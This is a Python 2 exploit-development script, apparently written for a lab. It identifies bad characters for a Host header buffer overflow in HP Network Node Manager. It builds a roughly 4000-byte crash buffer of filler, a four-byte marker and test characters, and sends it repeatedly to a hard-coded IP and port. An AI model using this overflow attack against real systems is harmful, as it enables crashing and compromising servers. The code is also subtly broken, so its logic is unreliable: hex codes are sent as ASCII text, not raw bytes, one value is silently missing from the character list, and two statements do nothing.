#!/usr/bin/python

#
# This python script is to be used for Bad Character identification
# If you want to do it the hard way.
# Apparently I do.
# It is designed for a the HP NNM target with a Host Header buffer overflow vulnerability
#
import socket
import os
import sys

ip="192.168.100.187"
port=int(7510)
url="/topology/home"

#
# Define total size which will help us with dynamic calculations
totalsize=int(4000)
#
#
# Below the initial charset is defined.
# I took the liberty of removing ,\x00,\x0a,\x0d and ,\x20, which is an informal SOP for me when it comes to payload development.
#

#
# I named this array lexor because I thought the word hexarray was messing it up
#
lexor=["01","02","03","04","05","06","07","08","09","0b","0c","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe","ff"]

#
# Setting the initial while variable "bugging"
bugging="yes"

#
# Ask the user if they want to exclude any more characters. We will do this via an array.
#

while bugging == "yes":
    print "[-] Please enter any bad characters you would like to exclude from the character set.\r\n"
    print "[-] By default, this script has 00, 0a, 0d and 20 removed in the original array"
    excludes=raw_input("[-] Make sure target is READY, then enter the characters to exclude in hex separated by a comma : ").split(',')


    #
    # This nested for loop removes the bad characters elected by the user
    #
    for loop0 in excludes:
        for loop1 in lexor:
            # Test command follows : print loop0, loop1
            if loop0 == loop1:
                lexor.remove(loop1)

    #
    # Array lexor now has the user selected "bad characters" removed
    #

    #
    # Now that the bad characters have been removed from the array, we can convert the array to a string.
    #

    test4bad=""
    for loop2 in lexor:
        test4bad+=loop2

    # test command follow print test4bad
    # exit()

    #
    # Define the length of the test4bad string now that we have removed the bad characters and maintain a 4000 bytes buffer
    #
    trim=(len(test4bad))
    # debug command print trim

    #
    # Build the crash payload
    #
    crash = "A"*3381 
    crash += "B"*4 
    crash += test4bad 
    crash += "C" * (615 - trim)
    #
    # Test commands follow, does not hurt if you enable them. Kinda cool to watch
    # After 2 or 3 runs and you observe the C's increasing while triming your 
    # bad characters
    # print crash
    # print "total size = "
    # print len(crash)
    # End test commands

    # Building the buffer

    buffer="GET " + url + " HTTP/1.1\r\n"
    buffer+="Host: " + crash + "\r\n"
    buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
    buffer+="User-Agent: Mozilla/4.0 (Windows NT 10.0) Java/1.6.0_03\r\n"
    buffer+="Content-Length: 1001024\r\n\r\n"

    #
    # I actually had "sending even buffer"
    #
    print "[-] Here we going, sending evil buffer!\n\n"

    expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
    expl.connect((ip, port))
    expl.send(buffer)
    expl.close

    # Spoiler, if you want to watch in WireShark, filter by tcp.port not protocol
    # Ask me how I know 

    print "[-] Payload sent, check debugger homie\n"

    #
    # let's clear that exclude array
    excludes == []
    
    bugging=raw_input("[-] Would you like to send another payload? If so enter yes or the script exits : ")
            
print "[-] Script complete"
exit()
